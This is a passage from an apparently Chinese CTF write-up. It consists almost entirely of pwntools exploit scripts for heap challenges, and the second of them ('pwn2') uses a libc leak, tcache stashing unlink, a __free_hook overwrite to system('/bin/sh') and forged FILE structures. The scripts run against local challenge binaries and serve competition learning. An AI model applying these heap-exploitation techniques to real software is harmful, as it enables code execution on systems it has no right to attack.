punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x80</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">91</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>free_hook<span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t<span class=\"token comment\">#gdb.attach(io)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>exp<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn2\"><a class=\"anchor\" href=\"#pwn2\">#</a> pwn2</h1>\n<p>比赛就两小时<br />\n想办法绕过这有点麻烦<br />\n<img data-src=\"/img/PWN/zhiye3.png\" alt=\"avatar\" /><br />\n 最后复现出来<br />\n exp：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>io<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>elf<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>libc<span class=\"token operator\">=</span>elf<span class=\"token punctuation\">.</span>libc</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'size: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'index: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'index: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">'content: '</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'>> '</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">'index: '</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">exp</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0~3</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0xe8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#4~5</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\tshow<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'ent: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\tlibc_base<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'\\x00\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span><span class=\"token number\">96</span><span class=\"token operator\">-</span><span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tbinsh<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\tsystem<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\tfree_hook<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\tglobal_max_fast<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x1eeb80</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'libc_base'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\tshow<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tio<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'ent: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\theap_base<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">0x110</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'heap_base'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>heap_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x108</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#6</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x108</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#7</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x108</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#8</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x108</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xf1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>heap_base<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x1eeb80</span><span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0xe8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#9</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t<span class=\"token comment\">#tcache_stashing_unlink over</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">0x90</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0xe8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#10</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0xe8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#11</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x20f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">0xa0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#12</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#13</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\tpayload<span class=\"token operator\">=</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x28</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_file_jumps'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>libc_base<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad2887</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">7</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">132</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdin_'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'\\xff'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span><span class=\"token string\">'\\x0a'</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x1ee4c0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span><span class=\"token string\">'\\xff'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x1eb880</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span><span class=\"token string\">'\\xff'</span><span class=\"token operator\">*</span><span class=\"token number\">4</span><span class=\"token operator\">+</span><span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x14</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_file_jumps'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdin_'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\tpayload<span class=\"token operator\">=</span>payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f0</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\tpayload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x20f</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t<span class=\"token keyword\">def</span> <span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t\toffset<span class=\"token operator\">=</span>b<span class=\"token operator\">-</span><span class=\"token number\">0x7f0b79060000</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t\tc<span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1f</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> u64<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">0x7f0000000000</span> <span class=\"token keyword\">and</span> u64<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token number\">0x800000000000</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\t\t\t\tc<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>offset<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t\t\t\tc<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>u64<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> c</pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\tfd<span class=\"token operator\">=</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./2'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t\tdele<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t\tedit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">0xa0</span><span class=\"token operator\">+</span><span class=\"token number\">0x1f8</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#14~15\\</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t\tpayload<span class=\"token operator\">=</span>fd<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">0x1f0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span 